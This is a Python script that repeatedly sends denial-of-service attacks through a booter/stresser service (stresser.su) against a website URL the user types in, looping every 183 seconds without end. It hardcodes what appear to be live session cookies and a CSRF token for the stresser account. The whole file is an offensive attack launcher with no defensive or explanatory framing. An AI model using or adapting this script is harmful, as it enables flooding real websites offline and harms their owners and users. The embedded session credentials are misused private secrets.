import asyncio

from colorama import *
from helpers.attack import Attack

class otter: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def get_information() -> dict:
        website_url = input(f"{Fore.GREEN}[WEBSITE]{Fore.GREEN}{Fore.RESET} Enter the website url: ")
        method = input(f"{Fore.GREEN}[METHOD]{Fore.GREEN}{Fore.RESET} Enter the method (https/http): ")
        
        return {"website": website_url, "method": method}
        
    async def run(self, result: dict) -> bool:
        try:
            await Attack.start(self, result["website"], result["method"])
            await asyncio.sleep(183)
        except:
            return False
        
if __name__ == "__main__":    
    otter_object: object = otter(cookie="_ga=GA1.2.975047996.1682536721; _gid=GA1.2.1846016745.1682536721; cf_clearance=MWPftL7ucNBlig445S8be.PAzHKBJSsmJLJ5ilXVU4Y-1682600087-0-160; UID=7iui5kndmqdou8cd1d6hpprdvj; _gat_gtag_UA_242087693_1=1; crisp-client%2Fsession%2F282fce01-adbf-401a-aaa1-bcd8c73ed1ec=session_a4b1837e-4d26-4f8d-9b69-77b9fd4deb1b; __RM=6e63204c05290fc27b43c6a1bd5bbf6frgh6587iui5kndmqdou8cd1d6hpprdvj6%242y%2410%24yKvDGePUQy5JqOeVOcpgfe8JoqHAWycmEnx%2F0rDIrI%2FRCLSv9h96O%2F%2Fb8b4b918cb66f10b621a5d2f7a00b4fc; X-CSRF-TOKEN=%242y%2410%24RT19TboYw.CTUHwkb8GUo.X%2FZYRU41%2FRYtbL8pmbvrO%2FdeD2BQBpK")
    result: dict = otter.get_information()
    
    while True:
        asyncio.run(otter_object.run(result=result))